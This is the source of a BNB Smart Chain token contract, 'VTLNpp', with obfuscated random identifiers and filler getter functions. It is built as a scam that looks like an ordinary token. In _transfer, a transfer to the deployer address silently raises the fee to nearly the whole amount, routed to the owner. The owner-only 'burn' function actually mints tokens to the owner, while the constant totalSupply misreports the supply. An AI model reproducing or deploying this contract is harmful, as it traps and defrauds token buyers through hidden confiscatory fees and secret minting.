/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.13;
contract xrtiQvUT {
string public  name = "VTLNpp";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant WkFZSd = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  OuNXTk = 100000000;
address private  wvGYGt = address(0);
address private  BrbUAr = address(0);
address private  dpfdil = address(0);
address private  VLFKpf = address(0);
uint8 public constant decimals = 18;
address private  rIliDp = address(0);
address private  ytbvlf = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  symbol = "VTLNpp";
uint256 private  MOZsZM = 10000000000;
address private  wwEEEp = address(0);
uint256 private  TWxYuh = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  FXbwmy = 10000000000000;
address private  ioqoLX = address(0);
uint256 private  VwpGdb = 1000000000000000000;
address public owner;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  NXcwbu = address(0);
uint256 private  OnlOCy = 1000000000000000;
uint256 private  lElJIN = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tgivcYr 0");
require(spender != address(0), "fgivcYr 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}




function _getOuNXTk() private returns (uint256) {
return OuNXTk;
}



function _getVLFKpf() private returns (address) {
return VLFKpf;
}

function _getytbvlf() private returns (address) {
return ytbvlf;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "givcYr");
require(to != address(0), "givcYr");
require(amount <= balanceOf[from], "givcYr");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WkFZSd/lElJIN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ioqoLX){
lElJIN = WkFZSd+4;
}
emit Transfer(from, to, transferAmount);
}






modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}








function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getwvGYGt() private returns (address) {
return wvGYGt;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getMOZsZM() private returns (uint256) {
return MOZsZM;
}

function _getOnlOCy() private returns (uint256) {
return OnlOCy;
}

function _getdpfdil() private returns (address) {
return dpfdil;
}

function _getNXcwbu() private returns (address) {
return NXcwbu;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getFXbwmy() private returns (uint256) {
return FXbwmy;
}

constructor () {
ioqoLX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getrIliDp() private returns (address) {
return rIliDp;
}



function _getBrbUAr() private returns (address) {
return BrbUAr;
}

function _getTWxYuh() private returns (uint256) {
return TWxYuh;
}

function _getwwEEEp() private returns (address) {
return wwEEEp;
}



function _getVwpGdb() private returns (uint256) {
return VwpGdb;
}




}